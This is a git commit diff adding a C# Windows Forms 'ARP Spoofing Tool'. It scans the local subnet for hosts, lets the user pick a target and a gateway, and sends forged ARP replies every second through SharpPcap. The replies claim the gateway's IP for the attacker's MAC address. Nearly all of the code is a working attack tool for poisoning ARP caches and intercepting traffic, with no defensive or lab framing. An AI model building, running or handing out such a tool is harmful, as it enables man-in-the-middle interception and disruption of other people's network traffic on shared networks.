39c6572db8ad55ceb679f5dc28fb47bab11e6151
- <-@->
2024-11-04 15:18:00 -0600

    Initial Commit

--- ArpSpoof/Form1.Designer.cs
+++ ArpSpoof/Form1.Designer.cs
@@ -2,15 +2,8 @@
 {
     partial class Form1
     {
-        /// <summary>
-        /// Required designer variable.
-        /// </summary>
         private System.ComponentModel.IContainer components = null;
 
-        /// <summary>
-        /// Clean up any resources being used.
-        /// </summary>
-        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
         protected override void Dispose(bool disposing)
         {
             if (disposing && (components != null))
@@ -22,19 +15,177 @@
 
         #region Windows Form Designer generated code
 
-        /// <summary>
-        /// Required method for Designer support - do not modify
-        /// the contents of this method with the code editor.
-        /// </summary>
         private void InitializeComponent()
         {
-            this.components = new System.ComponentModel.Container();
-            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(800, 450);
-            this.Text = "Form1";
+            this.adapterComboBox = new System.Windows.Forms.ComboBox();
+            this.adapterLabel = new System.Windows.Forms.Label();
+            this.scanButton = new System.Windows.Forms.Button();
+            this.targetComboBox = new System.Windows.Forms.ComboBox();
+            this.targetLabel = new System.Windows.Forms.Label();
+            this.gatewayIpLabel = new System.Windows.Forms.Label();
+            this.gatewayIpTextBox = new System.Windows.Forms.TextBox();
+            this.startButton = new System.Windows.Forms.Button();
+            this.stopButton = new System.Windows.Forms.Button();
+            this.logTextBox = new System.Windows.Forms.RichTextBox();
+            this.stopScanButton = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // adapterComboBox
+            // 
+            this.adapterComboBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
+            this.adapterComboBox.ForeColor = System.Drawing.Color.White;
+            this.adapterComboBox.Location = new System.Drawing.Point(153, 28);
+            this.adapterComboBox.Name = "adapterComboBox";
+            this.adapterComboBox.Size = new System.Drawing.Size(737, 21);
+            this.adapterComboBox.TabIndex = 1;
+            // 
+            // adapterLabel
+            // 
+            this.adapterLabel.AutoSize = true;
+            this.adapterLabel.ForeColor = System.Drawing.Color.White;
+            this.adapterLabel.Location = new System.Drawing.Point(20, 36);
+            this.adapterLabel.Name = "adapterLabel";
+            this.adapterLabel.Size = new System.Drawing.Size(80, 13);
+            this.adapterLabel.TabIndex = 0;
+            this.adapterLabel.Text = "Select Adapter:";
+            // 
+            // scanButton
+            // 
+            this.scanButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(122)))), ((int)(((byte)(204)))));
+            this.scanButton.ForeColor = System.Drawing.Color.White;
+            this.scanButton.Location = new System.Drawing.Point(153, 55);
+            this.scanButton.Name = "scanButton";
+            this.scanButton.Size = new System.Drawing.Size(60, 20);
+            this.scanButton.TabIndex = 2;
+            this.scanButton.Text = "Scan";
+            this.scanButton.UseVisualStyleBackColor = false;
+            this.scanButton.Click += new System.EventHandler(this.scanButton_Click);
+            // 
+            // targetComboBox
+            // 
+            this.targetComboBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
+            this.targetComboBox.ForeColor = System.Drawing.Color.White;
+            this.targetComboBox.Location = new System.Drawing.Point(153, 89);
+            this.targetComboBox.Name = "targetComboBox";
+            this.targetComboBox.Size = new System.Drawing.Size(737, 21);
+            this.targetComboBox.TabIndex = 4;
+            // 
+            // targetLabel
+            // 
+            this.targetLabel.AutoSize = true;
+            this.targetLabel.ForeColor = System.Drawing.Color.White;
+            this.targetLabel.Location = new System.Drawing.Point(23, 92);
+            this.targetLabel.Name = "targetLabel";
+            this.targetLabel.Size = new System.Drawing.Size(111, 13);
+            this.targetLabel.TabIndex = 3;
+            this.targetLabel.Text = "Select Target Device:";
+            // 
+            // gatewayIpLabel
+            // 
+            this.gatewayIpLabel.AutoSize = true;
+            this.gatewayIpLabel.ForeColor = System.Drawing.Color.White;
+            this.gatewayIpLabel.Location = new System.Drawing.Point(23, 132);
+            this.gatewayIpLabel.Name = "gatewayIpLabel";
+            this.gatewayIpLabel.Size = new System.Drawing.Size(106, 13);
+            this.gatewayIpLabel.TabIndex = 5;
+            this.gatewayIpLabel.Text = "Gateway IP Address:";
+            // 
+            // gatewayIpTextBox
+            // 
+            this.gatewayIpTextBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
+            this.gatewayIpTextBox.ForeColor = System.Drawing.Color.White;
+            this.gatewayIpTextBox.Location = new System.Drawing.Point(153, 129);
+            this.gatewayIpTextBox.Name = "gatewayIpTextBox";
+            this.gatewayIpTextBox.Size = new System.Drawing.Size(737, 20);
+            this.gatewayIpTextBox.TabIndex = 6;
+            // 
+            // startButton
+            // 
+            this.startButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(122)))), ((int)(((byte)(204)))));
+            this.startButton.ForeColor = System.Drawing.Color.White;
+            this.startButton.Location = new System.Drawing.Point(23, 206);
+            this.startButton.Name = "startButton";
+            this.startButton.Size = new System.Drawing.Size(150, 30);
+            this.startButton.TabIndex = 7;
+            this.startButton.Text = "Start Spoofing";
+            this.startButton.UseVisualStyleBackColor = false;
+            this.startButton.Click += new System.EventHandler(this.startButton_Click);
+            // 
+            // stopButton
+            // 
+            this.stopButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.stopButton.ForeColor = System.Drawing.Color.White;
+            this.stopButton.Location = new System.Drawing.Point(740, 206);
+            this.stopButton.Name = "stopButton";
+            this.stopButton.Size = new System.Drawing.Size(150, 30);
+            this.stopButton.TabIndex = 8;
+            this.stopButton.Text = "Stop Spoofing";
+            this.stopButton.UseVisualStyleBackColor = false;
+            this.stopButton.Click += new System.EventHandler(this.stopButton_Click);
+            // 
+            // logTextBox
+            // 
+            this.logTextBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
+            this.logTextBox.ForeColor = System.Drawing.Color.White;
+            this.logTextBox.Location = new System.Drawing.Point(23, 242);
+            this.logTextBox.Name = "logTextBox";
+            this.logTextBox.ReadOnly = true;
+            this.logTextBox.Size = new System.Drawing.Size(867, 200);
+            this.logTextBox.TabIndex = 9;
+            this.logTextBox.Text = "";
+            // 
+            // stopScanButton
+            // 
+            this.stopScanButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.stopScanButton.ForeColor = System.Drawing.Color.White;
+            this.stopScanButton.Location = new System.Drawing.Point(219, 55);
+            this.stopScanButton.Name = "stopScanButton";
+            this.stopScanButton.Size = new System.Drawing.Size(60, 20);
+            this.stopScanButton.TabIndex = 3;
+            this.stopScanButton.Text = "Stop Scan";
+            this.stopScanButton.UseVisualStyleBackColor = false;
+            this.stopScanButton.Click += new System.EventHandler(this.stopScanButton_Click);
+            // 
+            // Form1
+            // 
+            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(48)))));
+            this.ClientSize = new System.Drawing.Size(946, 457);
+            this.Controls.Add(this.stopScanButton);
+            this.Controls.Add(this.adapterLabel);
+            this.Controls.Add(this.adapterComboBox);
+            this.Controls.Add(this.scanButton);
+            this.Controls.Add(this.targetLabel);
+            this.Controls.Add(this.targetComboBox);
+            this.Controls.Add(this.gatewayIpLabel);
+            this.Controls.Add(this.gatewayIpTextBox);
+            this.Controls.Add(this.startButton);
+            this.Controls.Add(this.stopButton);
+            this.Controls.Add(this.logTextBox);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.Opacity = 0.9D;
+            this.ShowIcon = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "ARP Spoofing Tool";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
         }
+
+        private System.Windows.Forms.ComboBox adapterComboBox;
+        private System.Windows.Forms.Label adapterLabel;
+        private System.Windows.Forms.Button scanButton;
+        private System.Windows.Forms.Button stopScanButton;
+        private System.Windows.Forms.ComboBox targetComboBox;
+        private System.Windows.Forms.Label targetLabel;
+        private System.Windows.Forms.Label gatewayIpLabel;
+        private System.Windows.Forms.TextBox gatewayIpTextBox;
+        private System.Windows.Forms.Button startButton;
+        private System.Windows.Forms.Button stopButton;
+        private System.Windows.Forms.RichTextBox logTextBox;
+
 
         #endregion
     }
 }
-
--- ArpSpoof/Form1.cs
+++ ArpSpoof/Form1.cs
@@ -1,20 +1,270 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
 using System.Linq;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using SharpPcap;
 
 namespace ArpSpoof
 {
     public partial class Form1 : Form
     {
+        private ILiveDevice device;
+        private bool isSpoofing = false;
+        private PhysicalAddress sourceMac;
+        private CancellationTokenSource scanCancellationTokenSource;
+
         public Form1()
         {
             InitializeComponent();
+            LoadAdapters();
+        }
+
+        private void LoadAdapters()
+        {
+            var adapters = CaptureDeviceList.Instance;
+            foreach (var adapter in adapters)
+            {
+                var networkInterface = NetworkInterface.GetAllNetworkInterfaces()
+                    .FirstOrDefault(nic => nic.Id == adapter.Name.Replace("\\Device\\NPF_", ""));
+
+                string description = networkInterface != null
+                    ? $"{networkInterface.Name} ({networkInterface.Description})"
+                    : adapter.Name;
+
+                adapterComboBox.Items.Add(description);
+            }
+
+            if (adapterComboBox.Items.Count > 0)
+                adapterComboBox.SelectedIndex = 0;
+        }
+
+        private async void scanButton_Click(object sender, EventArgs e)
+        {
+            targetComboBox.Items.Clear();
+            AppendLog("Scanning network...");
+
+            scanCancellationTokenSource = new CancellationTokenSource();
+            var cancellationToken = scanCancellationTokenSource.Token;
+
+            string localIp = GetLocalIp();
+            if (string.IsNullOrEmpty(localIp))
+            {
+                AppendLog("Unable to retrieve local IP address.");
+                return;
+            }
+
+            string subnet = localIp.Substring(0, localIp.LastIndexOf('.') + 1);
+
+            // Run the scan in parallel, using async to handle each IP
+            var tasks = Enumerable.Range(1, 254)
+                .Select(i => $"{subnet}{i}")
+                .Select(ip => Task.Run(() => ScanIpAsync(ip, cancellationToken), cancellationToken))
+                .ToArray();
+
+            await Task.WhenAll(tasks);
+            AppendLog("Network scan completed.");
+        }
+
+        private async Task ScanIpAsync(string ip, CancellationToken cancellationToken)
+        {
+            try
+            {
+                await Task.Delay(50, cancellationToken);  // Prevents network congestion
+                if (cancellationToken.IsCancellationRequested) return;
+
+                if (SendArpRequest(ip))
+                {
+                    string hostname = GetHostName(ip);
+                    Invoke(new Action(() => targetComboBox.Items.Add($"{ip} - {hostname}")));
+                }
+            }
+            catch (OperationCanceledException)
+            {
+                AppendLog("Network scan was canceled.");
+            }
+            catch (Exception ex)
+            {
+                AppendLog($"Error scanning {ip}: {ex.Message}");
+            }
+        }
+
+        private void stopScanButton_Click(object sender, EventArgs e)
+        {
+            scanCancellationTokenSource?.Cancel();
+            AppendLog("Network scan stopped.");
+        }
+
+        // Send an ARP request to populate the ARP cache for a specific IP
+        [System.Runtime.InteropServices.DllImport("iphlpapi.dll", ExactSpelling = true)]
+        private static extern int SendARP(int destIp, int srcIp, byte[] macAddr, ref int physicalAddrLen);
+
+        private bool SendArpRequest(string ipAddress)
+        {
+            try
+            {
+                IPAddress ip = IPAddress.Parse(ipAddress);
+                byte[] macAddr = new byte[6];
+                int length = macAddr.Length;
+
+                int result = SendARP(BitConverter.ToInt32(ip.GetAddressBytes(), 0), 0, macAddr, ref length);
+
+                return result == 0 && macAddr.Any(b => b != 0);
+            }
+            catch (Exception ex)
+            {
+                AppendLog($"Error sending ARP request to {ipAddress}: {ex.Message}");
+                return false;
+            }
+        }
+
+        private string GetLocalIp()
+        {
+            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
+            {
+                var address = ni.GetIPProperties().UnicastAddresses
+                    .FirstOrDefault(ip => ip.Address.AddressFamily == AddressFamily.InterNetwork);
+                if (address != null)
+                    return address.Address.ToString();
+            }
+            return null;
+        }
+
+        private string GetHostName(string ip)
+        {
+            try
+            {
+                return Dns.GetHostEntry(ip).HostName;
+            }
+            catch
+            {
+                return "Unknown";
+            }
+        }
+
+        private async void startButton_Click(object sender, EventArgs e)
+        {
+            if (adapterComboBox.SelectedItem == null || targetComboBox.SelectedItem == null || string.IsNullOrEmpty(gatewayIpTextBox.Text))
+            {
+                AppendLog("Please select an adapter, target device, and enter the gateway IP address.");
+                return;
+            }
+
+            device = CaptureDeviceList.Instance[adapterComboBox.SelectedIndex] as ILiveDevice;
+            device.Open();
+
+            sourceMac = GetMacAddress(device);
+            if (sourceMac == null)
+            {
+                AppendLog("Failed to retrieve MAC address for the selected adapter.");
+                device.Close();
+                return;
+            }
+
+            // Retrieve target and gateway IP on the UI thread
+            string targetIp = targetComboBox.SelectedItem.ToString().Split(' ')[0];
+            string gatewayIp = gatewayIpTextBox.Text;
+
+            isSpoofing = true;
+            AppendLog("Started ARP spoofing.");
+
+            // Pass targetIp and gatewayIp to the spoofing task
+            await Task.Run(() => StartSpoofing(targetIp, gatewayIp));
+        }
+
+        private PhysicalAddress GetMacAddress(ICaptureDevice selectedDevice)
+        {
+            var deviceIp = GetLocalIp();
+
+            foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
+            {
+                var ipProps = nic.GetIPProperties().UnicastAddresses;
+                foreach (var addr in ipProps)
+                {
+                    if (addr.Address.ToString() == deviceIp && nic.GetPhysicalAddress() != null)
+                    {
+                        return nic.GetPhysicalAddress();
+                    }
+                }
+            }
+            return null;
+        }
+
+        private void StartSpoofing(string targetIp, string gatewayIp)
+        {
+            try
+            {
+                while (isSpoofing)
+                {
+                    var arpPacket = BuildArpPacket(targetIp, gatewayIp);
+                    device.SendPacket(arpPacket);
+                    Thread.Sleep(1000);
+                }
+            }
+            catch (Exception ex)
+            {
+                Invoke(new Action(() => AppendLog($"Error during spoofing: {ex.Message}")));
+            }
+        }
+
+
+        // Modify BuildArpPacket to accept targetIp and gatewayIp as parameters
+        private byte[] BuildArpPacket(string targetIp, string gatewayIp)
+        {
+            byte[] packet = new byte[42];
+            var targetMac = PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF").GetAddressBytes();
+            Array.Copy(targetMac, 0, packet, 0, 6);
+            Array.Copy(sourceMac.GetAddressBytes(), 0, packet, 6, 6);
+            packet[12] = 0x08; packet[13] = 0x06;
+
+            packet[14] = 0x00; packet[15] = 0x01;
+            packet[16] = 0x08; packet[17] = 0x00;
+            packet[18] = 0x06; packet[19] = 0x04;
+            packet[20] = 0x00; packet[21] = 0x02;
+
+            Array.Copy(sourceMac.GetAddressBytes(), 0, packet, 22, 6);
+            Array.Copy(IPAddress.Parse(gatewayIp).GetAddressBytes(), 0, packet, 28, 4);
+
+            Array.Copy(targetMac, 0, packet, 32, 6);
+            Array.Copy(IPAddress.Parse(targetIp).GetAddressBytes(), 0, packet, 38, 4);
+
+            return packet;
+        }
+
+        private void stopButton_Click(object sender, EventArgs e)
+        {
+            isSpoofing = false;
+            device?.Close();
+            AppendLog("Stopped ARP spoofing.");
+        }
+
+        private void AppendLog(string message)
+        {
+            if (logTextBox.InvokeRequired)
+            {
+                logTextBox.Invoke(new Action(() =>
+                {
+                    logTextBox.AppendText($"{message}{Environment.NewLine}");
+                    logTextBox.ScrollToCaret();
+                }));
+            }
+            else
+            {
+                logTextBox.AppendText($"{message}{Environment.NewLine}");
+                logTextBox.ScrollToCaret();
+            }
+        }
+
+        protected override void OnFormClosing(FormClosingEventArgs e)
+        {
+            isSpoofing = false;
+            device?.Close();
+            scanCancellationTokenSource?.Cancel();
+            base.OnFormClosing(e);
         }
     }
 }
